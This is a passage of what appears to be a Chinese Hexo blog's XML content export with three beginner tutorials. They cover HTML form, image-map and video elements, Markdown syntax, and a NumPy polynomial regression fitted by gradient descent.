class="string">"choose"</span> <span class="attr">checked</span>&gt;</span>单选2 <span class="comment">&lt;!-- 默认选中 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"choose"</span>&gt;</span>单选3</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>以上三种形式都可以实现按钮的功能，但是三者有着本质的区别，button比type=”button”的功能多，button可以当任何按钮来使用，适用范围更广泛。</li>
<li>type=”submit”用于提交表单，使用范围比type=”button”小一些</li>
<li>type=”button”一般用于配合js（JavaScript）使用</li>
<li>type=”submit”用于提交表单的时候，必须声明form里面的method属性，最好加上action属性</li>
</ul>
</li>
<li><p>其他类型表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"range"</span> <span class="attr">min</span>=<span class="string">"-100"</span> <span class="attr">max</span>=<span class="string">"100"</span> <span class="attr">value</span>=<span class="string">"50"</span>&gt;</span><span class="comment">&lt;!-- 可滑动 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    请选一个来进行选择</span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择4<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 与上面不同的是可以不选择提供的选项，而输入自己的选项 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">list</span>=<span class="string">"testList"</span> <span class="attr">placeholder</span>=<span class="string">"请输入你的选择"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">datalist</span> <span class="attr">id</span>=<span class="string">"testList"</span>&gt;</span><span class="comment">&lt;!-- 必须配合type="text"来使用，否则不会单独显示 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择4<span class="tag">&lt;/<span class="name">option</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">datalist</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"date"</span>&gt;</span><span class="comment">&lt;!-- 日期类型 不支持IE，火狐浏览器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"search"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 用户虽然看不到，但是提交表单的时候会把value值一起提交 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"隐藏的内容"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">src</span>=<span class="string">"password.png"</span> <span class="attr">width</span>=<span class="string">"20px"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 如果要上传文件的话，必须设置属性 form enctype="multipart/form-data" --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">multiple</span>&gt;</span><span class="comment">&lt;!-- multiple是指支持多个文件上传 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">required</span>&gt;</span><span class="comment">&lt;!-- required是指必须上传文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h2 id="创建分区响应图"><a href="#创建分区响应图" class="headerlink" title="创建分区响应图"></a>创建分区响应图</h2><p>分区响应图是指：将一张图片进行划分，用户点击不同的区域的时候，触发不同的点击事件。</p>
<p>该图需要设置usemap属性，属性值是一个map的ID名，map由area组成，即area是触发点击的区域，而area的shape属性说明由下表给出：</p>
<table border="1px">
        <tr>
            <!-- 行 -->
            <th>shape的值</th> <!-- 表头 -->
            <th>coords属性解释</th>
        </tr>
        <tr>
            <!-- 第二行 -->
            <td>Rect</td><!-- 单元格 -->
            <td>这个值代表矩形区域，用四个逗号分割的整数描述，即
                图像左边缘
                图像上边缘
                图像右边缘
                图像下边缘
            </td><!-- 单元格 -->
        </tr>
        <tr>
            <!-- 第三行 -->
            <td>Circle</td><!-- 单元格 -->
            <td>这个值代表圆形区域，用三个逗号分割的整数描述，即
                图像左边缘到圆心的距离
                图像上边缘到圆心的距离
                圆的半径
            </td><!-- 单元格 -->
        </tr>
        <tr>
            <!-- 第四行 -->
            <td>Poly</td><!-- 单元格 -->
            <td>这个值代表多边形区域，用至少六个逗号分割的整数描述，每一个数字表示多边形的一个顶点
            </td><!-- 单元格 -->
        </tr>
        <tr>
            <!-- 第五行 -->
            <td>Default</td><!-- 单元格 -->
            <td>这个值代表默认区域，不需要设置coords的值，即默认覆盖整张图片
            </td><!-- 单元格 -->
        </tr>
</table>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"OIP.png"</span> <span class="attr">usemap</span>=<span class="string">"#test_map"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span> <span class="attr">name</span>=<span class="string">"test_map"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">area</span> <span class="attr">href</span>=<span class="string">"4.html"</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"4,10,63,66"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">area</span> <span class="attr">href</span>=<span class="string">"9.html"</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"64,10,120,66"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="载入视频"><a href="#载入视频" class="headerlink" title="载入视频"></a>载入视频</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">"test_video.mp4"</span> <span class="attr">controls</span> <span class="attr">poster</span>=<span class="string">"cut.png"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>属性</th>
<th>属性介绍</th>
</tr>
</thead>
<tbody><tr>
<td>src</td>
<td>视频地址</td>
</tr>
<tr>
<td>width</td>
<td>视频宽度</td>
</tr>
<tr>
<td>height</td>
<td>视频高度</td>
</tr>
<tr>
<td>autoplay</td>
<td>网页完成后自动播放</td>
</tr>
<tr>
<td>preload</td>
<td>是否在页面加载后载入视频。<br>auto - 当页面加载后载入整个视频<br>metadata- 当页面加载后只载入第一帧<br>none - 当页面加载后不载入视频</td>
</tr>
<tr>
<td>controls</td>
<td>向用户显示控件，比如播放按钮</td>
</tr>
<tr>
<td>loop</td>
<td>当媒介文件完成播放后再次开始播放。</td>
</tr>
<tr>
<td>poster</td>
<td>视频封面</td>
</tr>
</tbody></table>
<p>由于不同的浏览器支持的视频格式不一样，同一款浏览器版本不同，支持的视频格式也不同，但是MP4格式和ogg格式的视频几乎覆盖了大多数浏览器的大多数版本，因此一般在载入视频的地方准备好两种素材就可以了</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">"test_video.mp4"</span> <span class="attr">controls</span> <span class="attr">poster</span>=<span class="string">"cut.png"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"test_video.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span> <span class="comment">&lt;!-- 默认使用这个资源播放，播放失败则播放下面的 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"test_video.ogg"</span> <span class="attr">type</span>=<span class="string">"video/ogg"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>html基础</tag>
      </tags>
  </entry>
  <entry>
    <title>markdown的相关语法</title>
    <url>/2020/02/23/markdown%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Markdown是一种可以使用普通文本编辑器编写的<a href="https://baike.baidu.com/item/标记语言/5964436" target="_blank" rel="noopener">标记语言</a>，通过简单的标记语法，它可以使普通文本内容具有一定的格式。</p>
<p>Markdown具有一系列衍生版本，用于扩展Markdown的功能（如表格、脚注、内嵌HTML等等），这些功能原初的Markdown尚不具备，它们能让Markdown转换成更多的格式，例如LaTeX，Docbook。Markdown增强版中比较有名的有Markdown Extra、MultiMarkdown、 Maruku等。这些衍生版本要么基于工具，如Pandoc；要么基于网站，如GitHub和Wikipedia，在语法上基本兼容，但在一些语法和渲染效果上有改动。</p>
<p>Markdown文件后期可以转换成html文件，所以在md文件中直接使用html语言也是可以的</p>
<h2 id="语法介绍"><a href="#语法介绍" class="headerlink" title="语法介绍"></a>语法介绍</h2><h3 id="1-标题（注意，许多地方一定不要忘了加空格）"><a href="#1-标题（注意，许多地方一定不要忘了加空格）" class="headerlink" title="1.标题（注意，许多地方一定不要忘了加空格）"></a>1.标题（注意，许多地方一定不要忘了加空格）</h3><p>标题的格式为 “#”+空格+标题名，其中“#”的个数代表这是几级标题，但是最多只能有6级标题</p>
 <a id="more"></a> 

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">### 三级标题</span><br><span class="line">###### 六级标题</span><br><span class="line">####### 这是一个错误的写法</span><br></pre></td></tr></table></figure>
<p>上面的代码等效于</p>
<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><p>####### 这是一个错误的写法</p>
<hr>
<h3 id="2-字体"><a href="#2-字体" class="headerlink" title="2.字体"></a>2.字体</h3><ul>
<li>斜体：在欲显示斜体内容的两头加“*”</li>
<li>加粗：在欲显示加粗内容的两头加“**”</li>
<li>粗斜体：在欲显示粗斜体内容的两头加“***”<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*这是斜体*</span><br><span class="line">**这是粗体**</span><br><span class="line">***这是粗斜体***</span><br></pre></td></tr></table></figure>
上面的代码等效于</li>
</ul>
<p><em>这是斜体</em><br><strong>这是粗体</strong><br><strong><em>这是粗斜体</em></strong></p>
<ul>
<li><p>进阶使用</p>
<p>指定字体：</p>
<pre><code>&lt;font face=&quot;黑体&quot;&gt;黑体字&lt;/font&gt;
&lt;font face=&quot;STCAIYUN&quot;&gt;我是华文彩云&lt;/font&gt;</code></pre><p>指定大小：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;font size&#x3D;20&gt;大小&#x3D;20&lt;&#x2F;font&gt;</span><br></pre></td></tr></table></figure>

<p>指定颜色：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;font color&#x3D;#ff0000&gt;红色&lt;&#x2F;font&gt;</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h3 id="3-列表"><a href="#3-列表" class="headerlink" title="3.列表"></a>3.列表</h3><ul>
<li><p>无序列表<br>“-”+空格+项目名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 项目一</span><br><span class="line">- 项目二</span><br></pre></td></tr></table></figure>
</li>
<li><p>有序列表<br>数字+“.”+空格+项目名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 项目三</span><br><span class="line">2. 项目四</span><br></pre></td></tr></table></figure>

<p>上面代码等效于</p>
<ul>
<li>项目一</li>
<li>项目二</li>
</ul>
<ol>
<li><p>项目三</p>
</li>
<li><p>项目四</p>
</li>
</ol>
</li>
</ul>
<h3 id="4-表格"><a href="#4-表格" class="headerlink" title="4.表格"></a>4.表格</h3><p>第一行是用“|”分开的表头<br>第二行是每一列的对齐方式，“:”在“-”的左边是左对齐，在右边是右对齐，没有“:”则默认是左对齐<br>第三行开始每一单元格用“|”分开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|上午|下午|晚上|</span><br><span class="line">|:-|:-:|-:|</span><br><span class="line">|写BUG(左对齐)|查BUG(居中对齐)|改BUG(右对齐)|</span><br><span class="line">| 写BUG(左对齐) | 查BUG(居中对齐) | 改BUG(右对齐) |</span><br></pre></td></tr></table></figure>

<p>上面的代码等价于</p>
<table>
<thead>
<tr>
<th align="left">上午</th>
<th align="center">下午</th>
<th align="right">晚上</th>
</tr>
</thead>
<tbody><tr>
<td align="left">写BUG(左对齐)</td>
<td align="center">查BUG(居中对齐)</td>
<td align="right">改BUG(右对齐)</td>
</tr>
<tr>
<td align="left">写BUG(左对齐)</td>
<td align="center">查BUG(居中对齐)</td>
<td align="right">改BUG(右对齐)</td>
</tr>
</tbody></table>
<h3 id="5-超链接"><a href="#5-超链接" class="headerlink" title="5.超链接"></a>5.超链接</h3><p>超链接的格式为：[描述]+(url)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[这是一个超链接](http:&#x2F;&#x2F;ruixin_huang.gitee.io&#x2F;mblog&#x2F;)</span><br></pre></td></tr></table></figure>
<p>上面的代码等价于<br><a href="https://yalexin.gitee.io">这是一个超链接</a></p>
<h3 id="6-图片"><a href="#6-图片" class="headerlink" title="6.图片"></a>6.图片</h3><p>可以这样子引用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![这是一张网络图片](https:&#x2F;&#x2F;tse3-mm.cn.bing.net&#x2F;th&#x2F;id&#x2F;OIP.UZQDK3pvdgKAoHoUVhyAhgHaDt?w&#x3D;299&amp;h&#x3D;149&amp;c&#x3D;7&amp;o&#x3D;5&amp;pid&#x3D;1.7 &quot;网络图片&quot;)</span><br></pre></td></tr></table></figure>
<p>上面代码等效于<br><img src="https://tse3-mm.cn.bing.net/th/id/OIP.UZQDK3pvdgKAoHoUVhyAhgHaDt?w=299&h=149&c=7&o=5&pid=1.7" alt="这是一张网络图片，随着时间流逝链接有可能失效"><br>当然了，如果我们想要修改图片属性也是可以的，不过是要写成html格式的<br>如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;tse3-mm.cn.bing.net&#x2F;th&#x2F;id&#x2F;OIP.UZQDK3pvdgKAoHoUVhyAhgHaDt?w&#x3D;299&amp;h&#x3D;149&amp;c&#x3D;7&amp;o&#x3D;5&amp;pid&#x3D;1.7 &quot; width&#x3D;500&#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>上面的代码等价于<br><img src="https://tse3-mm.cn.bing.net/th/id/OIP.UZQDK3pvdgKAoHoUVhyAhgHaDt?w=299&h=149&c=7&o=5&pid=1.7 " width="500/"><br>在hexo中，我们可以利用下面的方法显示本地图片</p>
<ol>
<li><p>在博客根目录下的_config.yml文件中，把post_asset_folder属性改为true，这样子我们每次用new指令新建文章的时候，hexo就会自动在文章所在目录下生成一个与文章同名的文件夹，我们只需要在该文件夹下放置我们所需要显示的图片资源文件</p>
</li>
<li><p>在需要显示图片的地方输入以下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% asset_img 图片名加文件后缀 图片描述(可省) %&#125;</span><br></pre></td></tr></table></figure>
<p>如</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% asset_img 317325.jpg 这是一张本地图片文件 %&#125;</span><br></pre></td></tr></table></figure>

<p>等价于</p>
<img src="/2020/02/23/markdown%E8%AF%AD%E6%B3%95/317325.jpg" class title="这是一张本地图片文件">

<p>也可以借助七牛云图床，将我们的图片上传后引用图片的链接。</p>
<h3 id="7-代码块"><a href="#7-代码块" class="headerlink" title="7.代码块"></a>7.代码块</h3><p>代码的格式是用三个反引号将代码包起来，并且这三个反引号要分别独占一行<br>如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(```)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"这是一段没有BUG的代码"</span>);</span><br><span class="line">(```)</span><br></pre></td></tr></table></figure>
<p>上面代码等效于</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"这是一段没有BUG的代码"</span>);</span><br></pre></td></tr></table></figure>

<h3 id="8-分割线"><a href="#8-分割线" class="headerlink" title="8.分割线"></a>8.分割线</h3><p>用三个或者三个以上的“-”或者“*”都可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">***</span><br></pre></td></tr></table></figure>
<hr>
<hr>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>numpy实现多项式回归模型</title>
    <url>/2022/04/11/numpy%E5%AE%9E%E7%8E%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E5%9B%9E%E5%BD%92%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>书接上回，上回我们介绍了线性回归，这次我们来关注一下多项式回归。</p>
<p>对于多项式回归，回归函数是回归变量多项式的回归 ，实际上线性回归是多项式回归中的特殊情况，即此自变量的项次是一次。</p>
<a id="more"></a>

<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><a href="https://baike.baidu.com/item/%E6%B3%B0%E5%8B%92%E5%85%AC%E5%BC%8F" target="_blank" rel="noopener">泰勒公式</a>告诉我们，任何函数在一定区间内都可以用多项式函数进行逼近，即</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220411221527.png" alt></p>
<p>假设我们的<code>n=1</code>，那么我们就回到了线性模型。</p>
<p>理论上我们的<code>n</code>越大，我们的函数就更加逼近原函数，不过在实际运算中，该值越大，计算量也就越大，而且计算机运算过程中也容易溢出，因此该值应该有一个比较符合实际意义的值。</p>
<p>参照上文，我们可以写出损失函数为：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220412180437.png" alt></p>
<p>该函数对每一项的系数求导为：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220412193952.png" alt></p>
<p>更新参数方法依旧是使用梯度下降分析法：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220412185006.png" alt></p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>我们先产生一个三角函数的数据，并加入随机偏差，模拟非线性数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def Data():</span><br><span class="line">    x &#x3D; np.linspace(0, 1, 100)</span><br><span class="line">    y &#x3D; np.sin(5 * x) + 0.1 + np.random.randn(len(x)) * 0.1</span><br><span class="line">    return x, y</span><br></pre></td></tr></table></figure>

<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220412190802.png" alt></p>
<p>再定义参数初始化函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(len=<span class="number">5</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    len 是多项式次数，该函数返回多项式的每一个系数</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> np.random.randn(len) * <span class="number">0.5</span></span><br></pre></td></tr></table></figure>

<p>接下来就是我们的回归主体部分啦！</p>
<p>在这之前，我们来学习一下怎么使用<code>NumPy</code>来实现多项式计算：在<code>NumPy</code>中，如果我们要计算:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">f(x) = a + b * x + c * x^2 + d * x^3</span><br></pre></td></tr></table></figure>

<p>可以使用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = np.poly1d(theta)</span><br><span class="line">f(x)</span><br></pre></td></tr></table></figure>

<p>其中，<code>theta</code>是多项式系数，例如计算<code>f(x)=0.7 * x^2+ 0.6 * x + 0.5</code>在<code>x=1.2</code>的值，可以用下面的代码完成：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = np.poly1d([<span class="number">0.7</span>, <span class="number">0.6</span>, <span class="number">0.5</span>])</span><br><span class="line">f(<span class="number">1.2</span>)</span><br><span class="line"><span class="number">2.2279999999999998</span></span><br></pre></td></tr></table></figure>

<p><strong>记住，<code>np.poly1d()</code>中的参数是从多项式最高项开始的</strong></p>
<p>因此我们可以定义计算<code>y_hat</code>的函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getY_Hat</span><span class="params">(x, theta)</span>:</span></span><br><span class="line">    <span class="comment"># 根据 theta 作为系数，生成多项式函数</span></span><br><span class="line">    f = np.poly1d(theta)</span><br><span class="line">    <span class="keyword">return</span> f(x)</span><br></pre></td></tr></table></figure>

<p>有了该函数后，我们可以继续定义<code>loss</code>函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loss</span><span class="params">(y, yHat)</span>:</span></span><br><span class="line">    n = len(y)</span><br><span class="line">    t1 = (y - yHat) * (y - yHat)</span><br><span class="line">    <span class="keyword">return</span> sum(t1) / n</span><br></pre></td></tr></table></figure>

<p>梯度下降分析法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更新每一个参数</span></span><br><span class="line">n = len(theta)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">    sm = sum((y_hat - y) * (x ** (n - <span class="number">1</span> - j)))</span><br><span class="line">    roundThetaIdx =  <span class="number">2</span> * sm / n</span><br><span class="line">    theta[j] = theta[j] - learning_rate * roundThetaIdx</span><br></pre></td></tr></table></figure>

<p>最终的结果：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220412193145.png" alt></p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on Tue Apr 12 17:47:32 2022</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: YaleXin</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt </span><br><span class="line"></span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Data</span><span class="params">()</span>:</span></span><br><span class="line">    x = np.linspace(<span class="number">0</span>, <span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">    y = np.sin(<span class="number">5</span> * x) + <span class="number">0.1</span> + np.random.randn(len(x)) * <span class="number">0.1</span></span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(len=<span class="number">5</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    len 是多项式次数</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> np.random.randn(len) * <span class="number">0.5</span></span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getY_Hat</span><span class="params">(x, theta)</span>:</span></span><br><span class="line">    <span class="comment"># 根据 theta 作为系数，生成多项式函数</span></span><br><span class="line">    f = np.poly1d(theta)</span><br><span class="line">    <span class="keyword">return</span> f(x)</span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loss</span><span class="params">(y, yHat)</span>:</span></span><br><span class="line">    n = len(y)</span><br><span class="line">    t1 = (y - yHat) * (y - yHat)</span><br><span class="line">    <span class="keyword">return</span> sum(t1) / n</span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PolynomialRegression</span><span class="params">(x, y, theta, ax, epoch=<span class="number">100</span>, learning_rate = <span class="number">0.01</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    梯度下降法</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    ax.set_title(<span class="string">"Loss change process"</span>)</span><br><span class="line">    loss_x = []</span><br><span class="line">    loss_y = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(epoch):</span><br><span class="line"></span><br><span class="line">        y_hat = getY_Hat(x, theta)</span><br><span class="line">        lst = loss(y, y_hat)</span><br><span class="line">        loss_x.append(i)</span><br><span class="line">        loss_y.append(lst)</span><br><span class="line">        print(<span class="string">"lost = "</span> + str(lst))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 更新每一个参数</span></span><br><span class="line">        n = len(theta)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            sm = sum((y_hat - y) * (x ** (n - <span class="number">1</span> - j)))</span><br><span class="line">            roundThetaIdx =  <span class="number">2</span> * sm / n</span><br><span class="line">            theta[j] = theta[j] - learning_rate * roundThetaIdx</span><br><span class="line">    ax.plot(loss_x, loss_y)</span><br><span class="line">    <span class="keyword">return</span> theta</span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plotAns</span><span class="params">(x, y, Y, ax)</span>:</span></span><br><span class="line">    <span class="string">"""绘制图形    </span></span><br><span class="line"><span class="string">    y是数据原始的y值，Y是拟合得到的值</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    ax.set_title(<span class="string">'Polynomial regression result'</span>)</span><br><span class="line">    ax.scatter(x, y, label = <span class="string">r'$y = f(x)$'</span>)</span><br><span class="line">    ax.plot(x, Y, label=<span class="string">r'$y = f(x)-theta $'</span>, color=<span class="string">'red'</span>)</span><br><span class="line">    ax.legend(loc=<span class="string">'upper left'</span>,prop=&#123;<span class="string">'family'</span>:<span class="string">'SimHei'</span>,<span class="string">'size'</span>:<span class="number">8</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    fig = plt.figure()</span><br><span class="line">    cost_ax = fig.add_subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>)  </span><br><span class="line">    ans_ax = fig.add_subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>)  </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 载入多项式回归数据</span></span><br><span class="line">    x, y = Data()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 初始化 最高次数为 10 的一组系数</span></span><br><span class="line">    theta = init(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置学习率</span></span><br><span class="line">    my_learning_rate = <span class="number">0.02</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># # 求解最优参数</span></span><br><span class="line">    theta = PolynomialRegression(x, y, theta, cost_ax,epoch=<span class="number">3000</span>)</span><br><span class="line">    f = np.poly1d(theta)</span><br><span class="line">    yhat = f(x)</span><br><span class="line">    </span><br><span class="line">    plotAns(x, y, yhat, ans_ax)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
